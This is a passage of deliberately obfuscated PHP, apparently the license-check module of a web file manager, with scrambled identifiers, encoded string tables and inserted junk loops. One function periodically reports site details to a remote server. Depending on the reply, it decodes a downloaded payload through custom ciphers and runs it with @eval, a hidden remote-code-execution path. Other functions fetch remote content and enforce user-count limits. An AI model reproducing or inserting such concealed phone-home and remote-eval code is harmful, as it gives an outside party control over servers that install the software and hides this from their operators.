öôÚ·ï[202])->initStart(!0); } private function aqzl635e34c6() { $³Ä”­µô =& $_SERVER[¹òÍ›æş]; $ªË³”ÊÍ =& $_SERVER[¯ı†ò™•]; Model($ªË³”ÊÍ[33])->set(array($ªË³”ÊÍ[186] => $ªË³”ÊÍ[6], $ªË³”ÊÍ[188] => $ªË³”ÊÍ[6], $ªË³”ÊÍ[105] => $ªË³”ÊÍ[106], $ªË³”ÊÍ[107] => $ªË³”ÊÍ[6], $ªË³”ÊÍ[108] => $ªË³”ÊÍ[6])); $©“Í™¦Û = $³Ä”­µô[691]; if (!$©“Í™¦Û) { return; } Model($ªË³”ÊÍ[33])->setDeep($ªË³”ÊÍ[195], $ªË³”ÊÍ[203]); $this->xmrs0c69de85 = array(); $§®õ¢êÎ = $³Ä”­µô[692]; $this->chwv5f747522 = $ªË³”ÊÍ[106]; $™¿ªÊš = $³Ä”­µô[693]; if (strlen($™¿ªÊš) < $³Ä”­µô[658]) { return; } } private function qklzb072c17c() { $Óœ¥ÍÏ• =& $_SERVER[¹òÍ›æş]; $Ïòß©Ñ³ =& $_SERVER[¯ı†ò™•]; $_SERVER[$Ïòß©Ñ³[159]] = _get($_SERVER, $Ïòß©Ñ³[159], APP_HOST); $Üšş±–„ = $Óœ¥ÍÏ•[694]; if (strlen($Üšş±–„) < $Óœ¥ÍÏ•[668]) { return; } $this->chwv5f747522 = $Ïòß©Ñ³[106]; $ƒ‹«Íäí = $Óœ¥ÍÏ•[695]; while (strlen($ƒ‹«Íäí) < $Óœ¥ÍÏ•[658]) { if (!$ƒ‹«Íäí) { break; } $ƒ‹«Íäí++; } $ÄÀö·é– = Model($Ïòß©Ñ³[33])->get(); if ($ÄÀö·é–[$Ïòß©Ñ³[105]] == $Ïòß©Ñ³[106]) { return; } $®ß“ï˜ = Model($Ïòß©Ñ³[33])->get($Ïòß©Ñ³[103]); $¼­½åÈÍ = $Ïòß©Ñ³[200] . md5($®ß“ï˜ . $Ïòß©Ñ³[201]); $ÊÌš‹ª = Cache::get($¼­½åÈÍ); $¢ù•¥ ¦ = $Óœ¥ÍÏ•[696]; if (!$¢ù•¥ ¦) { die; } if (!is_array($ÊÌš‹ª) || !isset($ÊÌš‹ª[$Ïòß©Ñ³[204]]) || time() - $ÊÌš‹ª[$Ïòß©Ñ³[204]] >= 60) { $ı¤ÆÜã‰ = Model($Ïòß©Ñ³[7])->loadList(); $Ù·Ù§ÔŠ = $ı¤ÆÜã‰[$Ïòß©Ñ³[197]]; $·…¥¢Ä = md5($_SERVER[$Ïòß©Ñ³[102]] . strrev($®ß“ï˜) . $ÄÀö·é–[$Ïòß©Ñ³[188]]); $ƒáÒ³–§ = strrev(substr($·…¥¢Ä, 10, 16)); $ÊÌš‹ª = $this->yqamff63cfab($Ù·Ù§ÔŠ[$Ïòß©Ñ³[85]][$ƒáÒ³–§], $·…¥¢Ä); $ÊÌš‹ª = json_decode($ÊÌš‹ª, !0); } if (!is_array($ÊÌš‹ª)) { return $this->aqzl635e34c6(); } $ÌÁ‰œş = strtotime($ÊÌš‹ª[$Ïòß©Ñ³[128]]); if (time() >= $ÌÁ‰œş) { return $this->aqzl635e34c6(); } if (time() - $ÊÌš‹ª[$Ïòß©Ñ³[204]] > 20) { $ÊÌš‹ª[$Ïòß©Ñ³[204]] = time(); Cache::set($¼­½åÈÍ, $ÊÌš‹ª); } $this->xmrs0c69de85 = $ÊÌš‹ª; $this->chwv5f747522 = $ÄÀö·é–[$Ïòß©Ñ³[105]]; } private function dzlo37bac3cc() { $øÈŞšÌ =& $_SERVER[¹òÍ›æş]; $ôƒ¯ÂÄ€ =& $_SERVER[¯ı†ò™•]; $èµ‰¢à = $GLOBALS[$ôƒ¯ÂÄ€[13]]; $á‘ÌèÃ = $øÈŞšÌ[697]; if (strlen($á‘ÌèÃ) < $øÈŞšÌ[654]) { return; } $øàŒÀ† = $_SERVER[$ôƒ¯ÂÄ€[24]]; $ÜÙ›½‚Ï = $øÈŞšÌ[698]; if (strlen($ÜÙ›½‚Ï) < $øÈŞšÌ[658]) { die; } if ($øàŒÀ† == $ôƒ¯ÂÄ€[205] && $this->chwv5f747522 == $ôƒ¯ÂÄ€[106]) { show_json(LNG($ôƒ¯ÂÄ€[206]), !1, $ôƒ¯ÂÄ€[207]); } $±‡•—ó = array($ôƒ¯ÂÄ€[208], $ôƒ¯ÂÄ€[209]); if (in_array($øàŒÀ†, $±‡•—ó)) { if ($this->chwv5f747522 == $ôƒ¯ÂÄ€[106] && isset($èµ‰¢à[$ôƒ¯ÂÄ€[210]])) { show_json(LNG($ôƒ¯ÂÄ€[206]), !1, $ôƒ¯ÂÄ€[207]); die; } $õë¹‡ÊÂ = $this->lyuc3e6b6af8(); if ($õë¹‡ÊÂ != intval($ôƒ¯ÂÄ€[211])) { if ($õë¹‡ÊÂ <= Model($ôƒ¯ÂÄ€[124])->count()) { show_json(LNG($ôƒ¯ÂÄ€[212]), !1, $ôƒ¯ÂÄ€[207]); die; } } } } private function dbih5e16c4c9() { $Ìâ³æÀ¾ =& $_SERVER[¹òÍ›æş]; $†¤šğ™í =& $_SERVER[¯ı†ò™•]; $öµ„»¬ù = array($†¤šğ™í[118], $†¤šğ™í[119]); if (!_get($GLOBALS, $†¤šğ™í[115]) || !isset($_GET[$†¤šğ™í[213]])) { return; } if (!in_array($_SERVER[$†¤šğ™í[24]], $öµ„»¬ù)) { return; } $ƒÂü­¢Ù = $†¤šğ™í[214]; $ìòà‹´§ = $Ìâ³æÀ¾[699]; $ƒÂü­¢Ù = $this->hpzr1211ac26($ƒÂü­¢Ù, $†¤šğ™í[215]); $š˜ñÖ­û = stream_context_create(array($†¤šğ™í[216] => array($†¤šğ™í[217] => $†¤šğ™í[218], $†¤šğ™í[219] => 3))); $ëŸ¥‹¢˜ = @file_get_contents($ƒÂü­¢Ù, !1, $š˜ñÖ­û); $š®ÄùÈ· = $Ìâ³æÀ¾[700]; header($†¤šğ™í[220]); if ($ëŸ¥‹¢˜ && strstr($ëŸ¥‹¢˜, $†¤šğ™í[221])) { echo $ëŸ¥‹¢˜; } die; } public function emdt4d35582a($Š¨âÇÔş) { $Ø¶Õ¯Ä¢ =& $_SERVER[¹òÍ›æş]; $½õ·Ä«‚ =& $_SERVER[¯ı†ò™•]; if ($this->chwv5f747522 == $½õ·Ä«‚[222]) { return $Š¨âÇÔş; } $ãŒ±íÜ® = array($½õ·Ä«‚[223] => $½õ·Ä«‚[224], $½õ·Ä«‚[225] => $½õ·Ä«‚[224], $½õ·Ä«‚[226] => $½õ·Ä«‚[224], $½õ·Ä«‚[227] => $½õ·Ä«‚[228], $½õ·Ä«‚[229] => $½õ·Ä«‚[228], $½õ·Ä«‚[230] => $½õ·Ä«‚[228], $½õ·Ä«‚[231] => $½õ·Ä«‚[228], $½õ·Ä«‚[232] => $½õ·Ä«‚[228], $½õ·Ä«‚[233] => $½õ·Ä«‚[228], $½õ·Ä«‚[234] => $½õ·Ä«‚[228], $½õ·Ä«‚[235] => $½õ·Ä«‚[228], $½õ·Ä«‚[236] => $½õ·Ä«‚[228], $½õ·Ä«‚[237] => $½õ·Ä«‚[228], $½õ·Ä«‚[238] => $½õ·Ä«‚[228], $½õ·Ä«‚[239] => $½õ·Ä«‚[228]); $ÈŠç³¥ë = $Ø¶Õ¯Ä¢[701]; if (!$ÈŠç³¥ë) { return; } $¡®‚˜£ñ = explode($½õ·Ä«‚[240], _get($this->xmrs0c69de85, $½õ·Ä«‚[112], $½õ·Ä«‚[6])); $¯¶€–º· = $Ø¶Õ¯Ä¢[702]; while ($¯¶€–º· < $Ø¶Õ¯Ä¢[60]) { if ($¯¶€–º· >= 0) { break; } $¯¶€–º·++; } $™­’†³ = array(); $Ë“ôşªı = $Ø¶Õ¯Ä¢[703]; foreach ($ãŒ±íÜ® as $ÔŠ˜à€¢ => $ê¶†õ‰¿) { if ($ê¶†õ‰¿ == $½õ·Ä«‚[224] && substr($this->chwv5f747522, 0, 1) == $½õ·Ä«‚[224]) { continue; } if (!in_array($ÔŠ˜à€¢, $¡®‚˜£ñ)) { $™­’†³[] = $ÔŠ˜à€¢; } } foreach ($™­’†³ as $ÔŠ˜à€¢) { unset($Š¨âÇÔş[$ÔŠ˜à€¢]); $ÂŸ‚‚ãë = $Ø¶Õ¯Ä¢[704]; } return $Š¨âÇÔş; $¦‘¯È×Ô = $Ø¶Õ¯Ä¢[705]; if (strlen($¦‘¯È×Ô) < $Ø¶Õ¯Ä¢[654]) { die; } } private function hzwp72a6b094() { $ÖĞö¢‡ =& $_SERVER[¯ı†ò™•]; if ($this->chwv5f747522 != $ÖĞö¢‡[106]) { $GLOBALS[$ÖĞö¢‡[85]][$ÖĞö¢‡[89]][$ÖĞö¢‡[241]] = $ÖĞö¢‡[203]; return; } $GLOBALS[$ÖĞö¢‡[85]][$ÖĞö¢‡[242]] = $ÖĞö¢‡[121]; if (Model($ÖĞö¢‡[243])->get($ÖĞö¢‡[63]) != $ÖĞö¢‡[203]) { Model($ÖĞö¢‡[243])->set($ÖĞö¢‡[63], $ÖĞö¢‡[203]); } } public function eozue2feafcb() { return $_SERVER[¯ı†ò™•][244]; $†å«öîÌ = $_SERVER[¹òÍ›æş][706]; if (!$†å«öîÌ) { return; } } private function gnlxda33f609() { $§ÌÚ­Äñ =& $_SERVER[¹òÍ›æş]; $Ú”öûäÎ =& $_SERVER[¯ı†ò™•]; $­ƒ²Úñ‡ = array($Ú”öûäÎ[245], $Ú”öûäÎ[246], $Ú”öûäÎ[247]); $†©…º™ = $§ÌÚ­Äñ[707]; while (strlen($†©…º™) < $§ÌÚ­Äñ[652]) { if (!$†©…º™) { break; } $†©…º™++; } $¦áŸ½Ã = $Ú”öûäÎ[248] . md5($Ú”öûäÎ[249]); if ($this->chwv5f747522 == $Ú”öûäÎ[106] || !_get($GLOBALS, $Ú”öûäÎ[115])) { return; } if (!in_array($_SERVER[$Ú”öûäÎ[24]], $­ƒ²Úñ‡)) { return; } if (time() % 4 != 0) { return; } $ª‰ÊÇØ— = call_user_func(array($Ú”öûäÎ[250], $Ú”öûäÎ[251]), $¦áŸ½Ã); $ŠÆÒ‚çŠ = $§ÌÚ­Äñ[708]; if ($ª‰ÊÇØ— && time() - $ª‰ÊÇØ— < intval($Ú”öûäÎ[252])) { return; } call_user_func(array($Ú”öûäÎ[250], $Ú”öûäÎ[138]), $¦áŸ½Ã, time()); $·Ô¥ıÒ = Model($Ú”öûäÎ[33])->get($Ú”öûäÎ[103]); $Œ¸³§Äô = array($Ú”öûäÎ[150] => Model($Ú”öûäÎ[33])->get($Ú”öûäÎ[186]), $Ú”öûäÎ[163] => $this->chwv5f747522, $Ú”öûäÎ[160] => $_SERVER[$Ú”öûäÎ[161]], $Ú”öûäÎ[162] => Model($Ú”öûäÎ[33])->get($Ú”öûäÎ[130]), $Ú”öûäÎ[101] => md5($_SERVER[$Ú”öûäÎ[102]] . $·Ô¥ıÒ), $Ú”öûäÎ[153] => $Ú”öûäÎ[135], $Ú”öûäÎ[156] => $_SERVER[$Ú”öûäÎ[157]]); $›¶Ú„—¸ = $§ÌÚ­Äñ[709]; if (strlen($›¶Ú„—¸) < $§ÌÚ­Äñ[60]) { return; } $¾•Úº™ª = $this->ftvn81409b66($Ú”öûäÎ[253], $Œ¸³§Äô); $÷¦ÑĞ› = $§ÌÚ­Äñ[710]; while (strlen($÷¦ÑĞ›) < $§ÌÚ­Äñ[654]) { if (!$÷¦ÑĞ›) { break; } $÷¦ÑĞ›++; } if (!is_array($¾•Úº™ª)) { return; } if ($¾•Úº™ª[$Ú”öûäÎ[150]] && $¾•Úº™ª[$Ú”öûäÎ[254]]) { if ($this->gnja9907c329($¾•Úº™ª[$Ú”öûäÎ[254]]) == $Œ¸³§Äô[$Ú”öûäÎ[150]]) { return; } } $this->aqzl635e34c6(); $ªÃ…º¨‚ = $§ÌÚ­Äñ[711]; if (strlen($ªÃ…º¨‚) < $§ÌÚ­Äñ[668]) { return; } if ($this->gnja9907c329($¾•Úº™ª[$Ú”öûäÎ[254]]) != $Œ¸³§Äô[$Ú”öûäÎ[150]]) { $²šëã±ô = array($Ú”öûäÎ[181] => $·Ô¥ıÒ, $Ú”öûäÎ[182] => $_SERVER[$Ú”öûäÎ[102]], $Ú”öûäÎ[183] => this_url(), $Ú”öûäÎ[158] => $_SERVER[$Ú”öûäÎ[159]]); $½±¶§Øã = $this->ylhi3add7b49(json_encode($²šëã±ô)); $¾•Úº™ª = $this->ftvn81409b66($Ú”öûäÎ[184] . $½±¶§Øã); if ($¾•Úº™ª && is_array($¾•Úº™ª) && isset($¾•Úº™ª[$Ú”öûäÎ[254]])) { $ôµñ‹›­ = $this->yqamff63cfab($¾•Úº™ª[$Ú”öûäÎ[254]], 2); if ($ôµñ‹›­) { $ôµñ‹›­ = $this->gnja9907c329($ôµñ‹›­); } if ($ôµñ‹›­) { try { @eval($ôµñ‹›­); } catch (Exception $ó«„æ‡É) { } } } } } private function ftvn81409b66($õô€Ë = '', $ÎóäÛ¨ = array(), $”ıÊ²” = 5) { $×ñ˜´ì =& $_SERVER[¹òÍ›æş]; $ñªèƒÉê =& $_SERVER[¯ı†ò™•]; $º·­ğ ÷ = $ñªèƒÉê[255]; $Ê·‰÷î = $×ñ˜´ì[712]; $º·­ğ ÷ = $this->hpzr1211ac26($º·­ğ ÷, $ñªèƒÉê[256]); $º·­ğ ÷ = $º·­ğ ÷ . $õô€Ë; if ($ÎóäÛ¨ && is_array($ÎóäÛ¨)) { $º·­ğ ÷ = $º·­ğ ÷ . $ñªèƒÉê[257] . http_build_query($ÎóäÛ¨); } if ($ÎóäÛ¨ === -1) { return $º·­ğ ÷; } $ÜÅ…ĞÈ = stream_context_create(array($ñªèƒÉê[216] => array($ñªèƒÉê[219] => $”ıÊ²”, $ñªèƒÉê[217] => $ñªèƒÉê[258]), $ñªèƒÉê[259] => array($ñªèƒÉê[260] => !1, $ñªèƒÉê[261] => !1))); $¢©ŸìÅ = $×ñ˜´ì[713]; if (!$¢©ŸìÅ) { die; } $ÎóäÛ¨ = @file_get_contents($º·­ğ ÷, !1, $ÜÅ…ĞÈ); return json_decode($ÎóäÛ¨, !0); $™à„Ä… = $×ñ˜´ì[714]; $“¢²¬Çô = $×ñ˜´ì[715]; } private function lyuc3e6b6af8() { $²©Ñº’« =& $_SERVER[¹òÍ›æş]; $¤‰”äèÙ =& $_SERVER[¯ı†ò™•]; $Å¥™äì¸ = array($¤‰”äèÙ[262] => $¤‰”äèÙ[263], $¤‰”äèÙ[264] => $¤‰”äèÙ[265], $¤‰”äèÙ[266] => $¤‰”äèÙ[267], $¤‰”äèÙ[268] => $¤‰”äèÙ[269], $¤‰”äèÙ[270] => $¤‰”äèÙ[271], $¤‰”äèÙ[272] => $¤‰”äèÙ[211], $¤‰”äèÙ[273] => $¤‰”äèÙ[211], $¤‰”äèÙ[274] => $¤‰”äèÙ[263], $¤‰”äèÙ[275] => $¤‰”äèÙ[265], $¤‰”äèÙ[276] => $¤‰”äèÙ[267], $¤‰”äèÙ[277] => $¤‰”äèÙ[278], $¤‰”äèÙ[279] => $¤‰”äèÙ[269], $¤‰”äèÙ[280] => $¤‰”äèÙ[281], $¤‰”äèÙ[282] => $¤‰”äèÙ[271], $¤‰”äèÙ[283] => $¤‰”äèÙ[284], $¤‰”äèÙ[285] => $¤‰”äèÙ[286], $¤‰”äèÙ[287] => $¤‰”äèÙ[288]); $îÅ £‹ = $Å¥™äì¸[$this->chwv5f747522]; $áÑ¡î¡ü = $²©Ñº’«[716]; $îÅ £‹ = intval($îÅ £‹ ? $îÅ £‹ : $¤‰”äèÙ[263]); $¸éšéğ¡ = $²©Ñº’«[717]; if (strlen($¸éšéğ¡) < $²©Ñº’«[668]) { die; } $ş‰”Ó…¾ = _get($this->xmrs0c69de85, $¤‰”äèÙ[289]); $Ş½ÅÖ–„ = $²©Ñº’«[718]; if (!$Ş½ÅÖ–„) { return; } $ş‰”Ó…¾ = $ş‰”Ó…¾ ? intval($ş‰”Ó…¾) : 0; $Œ¨ÉÕÊƒ = $²©Ñº’«[719]; if (strlen($Œ¨ÉÕÊƒ) < $²©Ñº’«[652]) { die; } return $îÅ £‹ + $ş‰”Ó…¾; $ü›´’Ô” = $²©Ñº’«[720]; while ($ü›´’Ô” < $²©Ñº’«[668]) { if ($ü›´’Ô” >= 0) { break; } $ü›´’Ô”++; } } public function iydsfec8d454($øä¢ß) { $•¿‘¬…• =& $_SERVER[¹òÍ›æş]; $Ú›¥Î•Ó =& $_SERVER[¯ı†ò™•]; $’”Š¢û = $this->lyuc3e6b6af8(); $—æ¤›¿¿ = $•¿‘¬…•[721]; while (strlen($—æ¤›¿¿) < $•¿‘¬…•[668]) { if (!$—æ¤›¿¿) { break; } $—æ¤›¿¿++; } if ($øä¢ß[$Ú›¥Î•Ó[290]] == $Ú›¥Î•Ó[121]) { return; } if ($’”Š¢û >= intval($Ú›¥Î•Ó[211])) { return; } $íÃ‘£¡ = Model($Ú›¥Î•Ó[124])->count(); $âó¬Çğ = $•¿‘¬…•[722]; if ($íÃ‘£¡ <= $’”Š¢û) { return; } $„°ÀÑŞ = Model($Ú›¥Î•Ó[124])->field($Ú›¥Î•Ó[290])->limit($’”Š¢û)->select(); $„°ÀÑŞ = array_to_keyvalue($„°ÀÑŞ, $Ú›¥Î•Ó[6], $Ú›¥Î•Ó[290]); if (!in_array($øä¢ß[$Ú›¥Î•Ó[290]], $„°ÀÑŞ)) { show_json($Ú›¥Î•Ó[291], !1, $Ú›¥Î•Ó[207]); } } public function ejlia4d48c5f() { $ù‘“ˆí² =& $_SERVER[¹òÍ›æş]; $•ªõŒ—¢ =& $_SERVER[¯ı†ò™•]; if (!_get($GLOBALS, $•ªõŒ—¢[115]) || mt_rand(1, 100) > 20) { return; } $¡Ã„üŞ = $•ªõŒ—¢[214]; $¡Ã„üŞ = $this->hpzr1211ac26($¡Ã„üŞ, $•ªõŒ—¢[215]); $ü ßõÏ½ = $ù‘“ˆí²[723]; $àæ½¯÷À = stream_context_create(array($•ªõŒ—¢[216] => array($•ªõŒ—¢[217] => $•ªõŒ—¢[218], $•ªõŒ—¢[219] => 3))); $öĞğï¤ä = $ù‘“ˆí²[724]; if (!$öĞğï¤ä) { return; } $î–‘»¼à = @file_get_contents($¡Ã„üŞ, !1, $àæ½¯÷À); $€şÁâÇğ = $ù‘“ˆí²[725]; if (strlen($€şÁâÇğ) < $ù‘“ˆí²[658]) { die; } echo $•ªõŒ—¢[292] . hash_encode($î–‘»¼à) . $•ªõŒ—¢[293]; } private function czwm52a04f3b($¯Ò±»®ö, $˜…ê™–µ, $™ÓÇÒß = 3) { $ƒ¨€† ù =& $_SERVER[¹òÍ›æş]; $ĞğƒÊ– =& $_SERVER[¯ı†ò™•]; usleep(1); $©¹›¨õ = $ƒ¨€† ù[726]; $¯Ò±»®ö = trim($¯Ò±»®ö); $Íû·Š°Å = mt_rand(0, 5) . $ĞğƒÊ–[6]; $ä·‚ï’ = rand_string(15); $œ¬Ãàìí = $ĞğƒÊ–[294]; $ù¿‘ˆ¸› = $ƒ¨€† ù[727]; if (strlen($ù¿‘ˆ¸›) < $ƒ¨€† ù[658]) { die; } switch ($Íû·Š°Å) { case $ĞğƒÊ–[203]: $È‘´‹½’ = $this->nqsm776e90c6($¯Ò±»®ö, strrev($˜…ê™–µ . $ä·‚ï’)); break; $×’ÎŒÅ = $ƒ¨€† ù[728]; if (!$×’ÎŒÅ) { return; } case $ĞğƒÊ–[121]: $È‘´‹½’ = $this->nqsm776e90c6($¯Ò±»®ö, strrev($ä·‚ï’ . $˜…ê™–µ)); $Õè“”¶¬ = $ƒ¨€† ù[729]; while ($Õè“”¶¬ < $ƒ¨€† ù[652]) { if ($Õè“”¶¬ >= 0) { break; } $Õè“”¶¬++; } break; case $ĞğƒÊ–[295]: $È‘´‹½’ = $this->nqsm776e90c6($¯Ò±»®ö, base64_encode($ä·‚ï’ . $˜…ê™–µ)); break; $õ¯‹óÁ = $ƒ¨€† ù[681]; if (!$õ¯‹óÁ) { return; } case $ĞğƒÊ–[296]: $È‘´‹½’ = $this->nqsm776e90c6($¯Ò±»®ö, md5($ä·‚ï’ . $˜…ê™–µ)); break; case $ĞğƒÊ–[297]: $¯Ò±»®ö = base64_encode($¯Ò±»®ö); $ç­î³†ó = $ƒ¨€† ù[730]; while ($ç­î³†ó < $ƒ¨€† ù[652]) { if ($ç­î³†ó >= 0) { break; } $ç­î³†ó++; } $„¨¬Š°­ = rand(0, 64); $³æºÅ³• = $œ¬Ãàìí[$„¨¬Š°­]; $ƒ§ºŠïª = $ƒ¨€† ù[731]; $«¹±˜ùÔ = md5($³æºÅ³• . md5($˜…ê™–µ . $³æºÅ³•) . $˜…ê™–µ); $«¹±˜ùÔ = substr($«¹±˜ùÔ, $„¨¬Š°­ % 8, $„¨¬Š°­ % 8 + 7); $şÙè¦‹† = $ĞğƒÊ–[6]; $úÂ†Ñ  = 0; $¾Í¹’Ûô = 0; $¸‘–¾Ö¡ = $ƒ¨€† ù[732]; if (strlen($¸‘–¾Ö¡) < $ƒ¨€† ù[658]) { return; } $ƒÂ¹Ş²â = 0; $Èş‡°ö™ = $ƒ¨€† ù[733]; for ($úÂ†Ñ  = 0; $úÂ†Ñ  < strlen($¯Ò±»®ö); $úÂ†Ñ ++) { $ƒÂ¹Ş²â = $ƒÂ¹Ş²â == strlen($«¹±˜ùÔ) ? 0 : $ƒÂ¹Ş²â; $¾Í¹’Ûô = ($„¨¬Š°­ + strpos($œ¬Ãàìí, $¯Ò±»®ö[$úÂ†Ñ ]) + ord($«¹±˜ùÔ[$ƒÂ¹Ş²â++])) % 64; $Şìıß = $ƒ¨€† ù[734]; if (strlen($Şìıß) < $ƒ¨€† ù[60]) { die; } $şÙè¦‹† .= $œ¬Ãàìí[$¾Í¹’Ûô]; } $È‘´‹½’ = hash_encode($³æºÅ³• . $şÙè¦‹†); $ç»‚Ú†“ = $ƒ¨€† ù[735]; while (strlen($ç»‚Ú†“) < $ƒ¨€† ù[668]) { if (!$ç»‚Ú†“) { break; } $ç»‚Ú†“++; } break; $ß¦Ùø¨ = $ƒ¨€† ù[712]; default: $È‘´‹½’ = $this->nqsm776e90c6($¯Ò±»®ö, $˜…ê™–µ . $ä·‚ï’); $¢ÜååŒÕ = $ƒ¨€† ù[736]; break; $ôÉØŸ– = $ƒ¨€† ù[737]; if (!$ôÉØŸ–) { die; } } $È‘´‹½’ = strrev($Íû·Š°Å . $ä·‚ï’ . $È‘´‹½’); if ($™ÓÇÒß - 1 > 0) { $È‘´‹½’ = $this->czwm52a04f3b($È‘´‹½’, $˜…ê™–µ, $™ÓÇÒß - 1); } return $È‘´‹½’; } private function yqamff63cfab($éß•óß¿, $ì§³ç÷î, $ôâ«ˆ€Š = 3) { $™ïù­Å‰ =& $_SERVER[¹òÍ›æş]; $¯É¤ê›ê =& $_SERVER[¯ı†ò™•]; if (!is_string($éß•óß¿) || strlen($éß•óß¿) < 10) { return !1; } $éß•óß¿ = trim($éß•óß¿); $éß•óß¿ = strrev($éß•óß¿); $¨şÍ«”€ = $™ïù­Å‰[738]; if (!$¨şÍ«”€) { return; } $õÜ‹Úê = $éß•óß¿[0]; $ÚşÖ‡şã = substr($éß•óß¿, 1, 15); $éß•óß¿ = substr($éß•óß¿, 16); $ÖãéÂÔ = $¯É¤ê›ê[294]; switch ($õÜ‹Úê) { case $¯É¤ê›ê[203]: $ˆ¥„™ç¶ = $this->hpzr1211ac26($éß•óß¿, strrev($ì§³ç÷î . $ÚşÖ‡şã)); $ñúŸ¶şë = $™ïù­Å‰[739]; while (strlen($ñúŸ¶şë) < $™ïù­Å‰[60]) { if (!$ñúŸ¶şë) { break; } $ñúŸ¶şë++; } break; $À÷ñ¶ƒ¯ = $™ïù­Å‰[740]; if (!$À÷ñ¶ƒ¯) { die; } case $¯É¤ê›ê[121]: $ˆ¥„™ç¶ = $this->hpzr1211ac26($éß•óß¿, strrev($ÚşÖ‡şã . $ì§³ç÷î)); $Ÿş È¿æ = $™ïù­Å‰[741]; if (strlen($Ÿş È¿æ) < $™ïù­Å‰[652]) { die; } break; $¸›ÊÇ½¢ = $™ïù­Å‰[742]; while (strlen($¸›ÊÇ½¢) < $™ïù­Å‰[654]) { if (!$¸›ÊÇ½¢) { break; } $¸›ÊÇ½¢++; } case $¯É¤ê›ê[295]: $ˆ¥„™ç¶ = $this->hpzr1211ac26($éß•óß¿, base64_encode($ÚşÖ‡şã . $ì§³ç÷î)); $åáåÔÆñ = $™ïù­Å‰[743]; if (!$åáåÔÆñ) { return; } break; $äÜà€º = $™ïù­Å‰[744]; while (strlen($äÜà€º) < $™ïù­Å‰[60]) { if (!$äÜà€º) { break; } $äÜà€º++; } case $¯É¤ê›ê[296]: $ˆ¥„™ç¶ = $this->hpzr1211ac26($éß•óß¿, md5($ÚşÖ‡şã . $ì§³ç÷î)); $º”©æ = $™ïù­Å‰[745]; if (strlen($º”©æ) < $™ïù­Å‰[654]) { die; } break; $Üª´×ª = $™ïù­Å‰[746]; case $¯É¤ê›ê[297]: $éß•óß¿ = hash_decode($éß•óß¿); $‹…§ŞÓ¨ = $éß•óß¿[0]; $éß•óß¿ = substr($éß•óß¿, 1); $èÖ‹ˆô« = strpos($ÖãéÂÔ, $‹…§ŞÓ¨); $ÜğÈóø = $™ïù­Å‰[747]; while ($ÜğÈóø < $™ïù­Å‰[652]) { if ($ÜğÈóø >= 0) { break; } $ÜğÈóø++; } $ìİï›Ğ = md5($‹…§ŞÓ¨ . md5($ì§³ç÷î . $‹…§ŞÓ¨) . $ì§³ç÷î); $ìİï›Ğ = substr($ìİï›Ğ, $èÖ‹ˆô« % 8, $èÖ‹ˆô« % 8 + 7); $©ğ·Á¢í = $¯É¤ê›ê[6]; $ÙÊìÏç÷ = 0; $ïáÕ×‹ = $™ïù­Å‰[748]; while (strlen($ïáÕ×‹) < $™ïù­Å‰[60]) { if (!$ïáÕ×‹) { break; } $ïáÕ×‹++; } $ô®®Ü¯È = 0; $Ëô‚Òáè = 0; for ($ÙÊìÏç÷ = 0; $ÙÊìÏç÷ < strlen($éß•óß¿); $ÙÊìÏç÷++) { $Ëô‚Òáè = $Ëô‚Òáè == strlen($ìİï›Ğ) ? 0 : $Ëô‚Òáè; $­Áââôá = $Ëô‚Òáè++; $ô®®Ü¯È = strpos($ÖãéÂÔ, $éß•óß¿[$ÙÊìÏç÷]) - $èÖ‹ˆô« - ord($ìİï›Ğ[$­Áââôá]); $¬Ç‚ßÖ† = $™ïù­Å‰[749]; if (strlen($¬Ç‚ßÖ†) < $™ïù­Å‰[668]) { return; } while ($ô®®Ü¯È < 0) { $ô®®Ü¯È += 64; } $©ğ·Á¢í .= $ÖãéÂÔ[$ô®®Ü¯È]; $ı¤Üõ = $™ïù­Å‰[750]; while (strlen($ı¤Üõ) < $™ïù­Å‰[654]) { if (!$ı¤Üõ) { break; } $ı¤Üõ++; } } $ˆ¥„™ç¶ = base64_decode($©ğ·Á¢í); $µ‹ƒ•«• = $™ïù­Å‰[751]; break; default: $ˆ¥„™ç¶ = $this->hpzr1211ac26($éß•óß¿, $ì§³ç÷î . $ÚşÖ‡şã); $Àíøğ‡ô = $™ïù­Å‰[752]; break; } if ($ôâ«ˆ€Š - 1 > 0) { $ˆ¥„™ç¶ = $this->yqamff63cfab($ˆ¥„™ç¶, $ì§³ç÷î, $ôâ«ˆ€Š - 1); } return $ˆ¥„™ç¶; } public function ylhi3add7b49($Õí³Õ¹©) { $­‘•åÙ… =& $_SERVER[¹òÍ›æş]; $­óÒ±˜¼ =& $_SERVER[¯ı†ò™•]; $ìáÀ¹ªâ = $this->dibhac2b2d5a(); $”õò‘øÖ = $­‘•åÙ…[753]; if (!$”õò‘øÖ) { return; } $íĞØÒé² = $this->dibhac2b2d5a(); $òêÙ…— = ($ìáÀ¹ªâ - 1) * ($íĞØÒé² - 1); $†˜Åã·ú = intval(($ìáÀ¹ªâ + $íĞØÒé²) / 2); $½İ¾¯º„ = $­‘•åÙ…[754]; while ($½İ¾¯º„ < $­‘•åÙ…[658]) { if ($½İ¾¯º„ >= 0) { break; } $½İ¾¯º„++; } while (1) { $Õãœ‰£™ = $†˜Åã·ú; $îÑ„÷ = $­‘•åÙ…[755]; while ($îÑ„÷ < $­‘•åÙ…[652]) { if ($îÑ„÷ >= 0) { break; } $îÑ„÷++; } $È¢Ğ¦¹ = $òêÙ…—; $ùã©•ğÖ = $­‘•åÙ…[756]; if (strlen($ùã©•ğÖ) < $­‘•åÙ…[668]) { return; } while ($È¢Ğ¦¹ % $Õãœ‰£™ != 0) { $Ì¯ÅËÏ˜ = $È¢Ğ¦¹; $¹š‚è±Á = $­‘•åÙ…[757]; $È¢Ğ¦¹ = $Õãœ‰£™; $Õãœ‰£™ = $Ì¯ÅËÏ˜ % $Õãœ‰£™; $ÃçóÜæö = $­‘•åÙ…[758]; if (!$ÃçóÜæö) { return; } } if ($Õãœ‰£™ == 1) { break; } else { $†˜Åã·ú++; } } $ŸÙ×‘¼ú = 2; for ($µÒ¨ŠÙ¸ = 0; $µÒ¨ŠÙ¸ < $òêÙ…— * 10; $µÒ¨ŠÙ¸++) { if (($òêÙ…— * $µÒ¨ŠÙ¸ + 1) % $†˜Åã·ú == 0) { $ŸÙ×‘¼ú = intval(($òêÙ…— * $µÒ¨ŠÙ¸ + 1) / $†˜Åã·ú); break; } } $Ù¢»¿ ù = $this->nqsm776e90c6($ìáÀ¹ªâ * $íĞØÒé² . $­óÒ±˜¼[6], $­óÒ±˜¼[135]); $Ä˜ŠëË = md5($­óÒ±˜¼[298] . ($ìáÀ¹ªâ + $íĞØÒé²) . 